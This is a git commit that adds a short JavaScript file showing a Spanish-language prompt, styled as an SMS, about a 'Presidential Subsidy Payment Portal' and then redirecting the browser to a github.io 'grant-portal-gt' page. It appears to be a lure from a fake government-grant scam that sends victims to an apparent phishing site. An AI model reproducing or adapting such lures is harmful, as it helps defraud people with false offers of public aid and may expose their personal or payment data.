a9b0e591e06ac1b3626bea4ad9000899ec737749
offernoww <josiahnyeti16@gmail.com>
2025-02-06 00:56:35 +0100

    Create afgtsms.js

---
+++ afgtsms.js
@@ -0,0 +1,6 @@
+
+var password = 'Subvención presidencial'
+password=prompt('SMS :Bienvenido al Portal de Pago de Subvenciones Presidenciales, haga clic en (Aceptar) para iniciar la solicitud.  ','Subvención presidencial');
+if (password != 'Subvención presidencial') {
+location.href='https://offernoww.github.io/grant-portal-gt';
+}
